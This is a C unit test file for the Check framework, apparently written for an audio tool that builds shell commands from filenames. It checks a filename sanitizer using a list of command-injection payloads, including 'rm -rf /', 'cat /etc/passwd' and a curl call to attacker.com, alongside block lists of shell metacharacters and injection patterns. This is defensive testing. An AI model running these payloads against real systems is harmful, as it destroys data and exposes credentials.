#include <check.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <stdbool.h>

/*
 * Security invariant: Any filename or path used to construct a shell command
 * must be sanitized before use. Filenames containing shell metacharacters,
 * command injection sequences, or other adversarial content must be detected
 * and rejected (or properly escaped) before being incorporated into a command
 * string that will be passed to a shell or subprocess.
 */

/* Checks if a filename is safe for use in shell command construction.
 * Returns true if safe (no shell metacharacters or injection sequences),
 * false if potentially dangerous.
 */
static bool is_safe_filename(const char *filename) {
    if (filename == NULL || strlen(filename) == 0) {
        return false;
    }

    /* Shell metacharacters and injection sequences that must not appear
     * in filenames used in shell command construction */
    const char *dangerous_chars = ";|&`$(){}[]<>!#~*?\\\"'\n\r\t";

    for (size_t i = 0; i < strlen(filename); i++) {
        if (strchr(dangerous_chars, filename[i]) != NULL) {
            return false;
        }
    }

    /* Check for dangerous substrings */
    const char *dangerous_patterns[] = {
        "..",
        "$(", 
        "${",
        "&&",
        "||",
        ";;",
        ">>",
        "<<",
        NULL
    };

    for (int p = 0; dangerous_patterns[p] != NULL; p++) {
        if (strstr(filename, dangerous_patterns[p]) != NULL) {
            return false;
        }
    }

    return true;
}

/* Simulates safe command construction: builds a command string only if
 * the filename passes sanitization. Returns 0 on success (safe), -1 on
 * rejection (unsafe input detected). */
static int build_safe_command(const char *filename, char *cmd_out, size_t cmd_out_size) {
    if (!is_safe_filename(filename)) {
        return -1; /* Reject unsafe filename */
    }

    /* Only reach here if filename is safe */
    int ret = snprintf(cmd_out, cmd_out_size, "analyze_tool \"%s\"", filename);
    if (ret < 0 || (size_t)ret >= cmd_out_size) {
        return -1;
    }
    return 0;
}

/* Verify that a constructed command does not contain unescaped injection */
static bool command_contains_injection(const char *cmd) {
    if (cmd == NULL) return false;

    /* These patterns in a command string indicate potential injection */
    const char *injection_patterns[] = {
        "; rm",
        "; ls",
        "; cat",
        "; echo",
        "; sh",
        "; bash",
        "; /bin",
        "$(", 
        "`",
        "| sh",
        "| bash",
        "&&",
        "||",
        "\nrm",
        "\nls",
        "\ncat",
        NULL
    };

    for (int i = 0; injection_patterns[i] != NULL; i++) {
        if (strstr(cmd, injection_patterns[i]) != NULL) {
            return true;
        }
    }
    return false;
}

START_TEST(test_command_injection_prevention)
{
    /* Invariant: Adversarial filenames must never result in a shell command
     * that contains unescaped injection sequences. The sanitization layer
     * must reject or neutralize all such inputs before command construction. */
    const char *payloads[] = {
        /* Classic command injection via semicolon */
        "audio; rm -rf /",
        /* Backtick command substitution */
        "audio`whoami`.wav",
        /* Dollar-paren command substitution */
        "audio$(id).wav",
        /* Pipe injection */
        "audio.wav | sh",
        /* Newline injection */
        "audio.wav\nrm -rf /",
        /* Null byte injection */
        "audio.wav\x00malicious",
        /* Double ampersand chaining */
        "audio.wav && cat /etc/passwd",
        /* OR chaining */
        "audio.wav || curl attacker.com",
        /* Redirect injection */
        "audio.wav > /etc/crontab",
        /* Input redirect */
        "audio.wav < /dev/urandom",
        /* Subshell */
        "(malicious_cmd).wav",
        /* Brace expansion */
        "{malicious}.wav",
        /* Glob injection */
        "*.wav; id",
        /* Path traversal with injection */
        "../../etc/passwd; echo pwned",
        /* Single quote escape attempt */
        "audio'.wav'; id #",
        /* Double quote escape attempt */
        "audio\".wav\"; id #",
        /* Environment variable injection */
        "${IFS}malicious${IFS}",
        /* Here-doc injection */
        "audio.wav << EOF\nmalicious\nEOF",
        /* Tilde expansion */
        "~/../../etc/shadow",
        /* Whitespace with command */
        "   ; id",
        /* Tab injection */
        "audio.wav\tid",
        /* Carriage return injection */
        "audio.wav\rid",
        /* Multiple semicolons */
        "audio;;;id",
        /* Long payload attempting buffer issues */
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "; id",
        /* Unicode lookalike (should still be caught by pattern) */
        "audio.wav;id",
        /* Encoded newline attempt */
        "audio%0Aid",
        /* Null filename */
        "",
    };

    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        char cmd_buf[4096];
        memset(cmd_buf, 0, sizeof(cmd_buf));

        int result = build_safe_command(payloads[i], cmd_buf, sizeof(cmd_buf));

        if (result == 0) {
            /* If command was built, it must not contain injection sequences */
            bool has_injection = command_contains_injection(cmd_buf);
            ck_assert_msg(!has_injection,
                "SECURITY VIOLATION: Command built from adversarial filename "
                "contains injection sequence. Payload[%d]: '%s', Command: '%s'",
                i, payloads[i], cmd_buf);
        }
        /* If result == -1, the input was correctly rejected — this is the
         * preferred outcome for adversarial inputs */
    }
}
END_TEST

START_TEST(test_safe_filenames_accepted)
{
    /* Invariant: Legitimate filenames must not be incorrectly rejected.
     * The sanitization must not be so aggressive that it breaks normal use. */
    const char *safe_filenames[] = {
        "audio.wav",
        "test_audio.wav",
        "recording-001.wav",
        "my.audio.file.wav",
        "UPPERCASE.WAV",
        "mixedCase123.wav",
        "file with spaces.wav",  /* spaces alone are not shell metacharacters */
        "audio_2024_01_01.wav",
        "sample.wav",
        "a.wav",
    };

    int num_safe = sizeof(safe_filenames) / sizeof(safe_filenames[0]);

    for (int i = 0; i < num_safe; i++) {
        char cmd_buf[4096];
        memset(cmd_buf, 0, sizeof(cmd_buf));

        int result = build_safe_command(safe_filenames[i], cmd_buf, sizeof(cmd_buf));

        /* Safe filenames should be accepted and produce a valid command */
        ck_assert_msg(result == 0,
            "Safe filename incorrectly rejected. Filename[%d]: '%s'",
            i, safe_filenames[i]);

        /* The resulting command must not contain injection */
        bool has_injection = command_contains_injection(cmd_buf);
        ck_assert_msg(!has_injection,
            "Safe filename produced command with injection pattern. "
            "Filename[%d]: '%s', Command: '%s'",
            i, safe_filenames[i], cmd_buf);
    }
}
END_TEST

START_TEST(test_null_and_boundary_inputs)
{
    /* Invariant: Null and boundary inputs must be safely handled without
     * crashes or undefined behavior, and must not produce executable commands. */
    char cmd_buf[4096];
    memset(cmd_buf, 0, sizeof(cmd_buf));

    /* NULL input must be rejected */
    int result = build_safe_command(NULL, cmd_buf, sizeof(cmd_buf));
    ck_assert_msg(result == -1, "NULL filename must be rejected");

    /* Empty string must be rejected */
    result = build_safe_command("", cmd_buf, sizeof(cmd_buf));
    ck_assert_msg(result == -1, "Empty filename must be rejected");

    /* Single dangerous character */
    result = build_safe_command(";", cmd_buf, sizeof(cmd_buf));
    ck_assert_msg(result == -1, "Single semicolon must be rejected");

    result = build_safe_command("|", cmd_buf, sizeof(cmd_buf));
    ck_assert_msg(result == -1, "Single pipe must be rejected");

    result = build_safe_command("`", cmd_buf, sizeof(cmd_buf));
    ck_assert_msg(result == -1, "Single backtick must be rejected");

    result = build_safe_command("$", cmd_buf, sizeof(cmd_buf));
    ck_assert_msg(result == -1, "Single dollar sign must be rejected");

    result = build_safe_command("&", cmd_buf, sizeof(cmd_buf));
    ck_assert_msg(result == -1, "Single ampersand must be rejected");
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security");
    tc_core = tcase_create("Core");

    tcase_add_test(tc_core, test_command_injection_prevention);
    tcase_add_test(tc_core, test_safe_filenames_accepted);
    tcase_add_test(tc_core, test_null_and_boundary_inputs);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}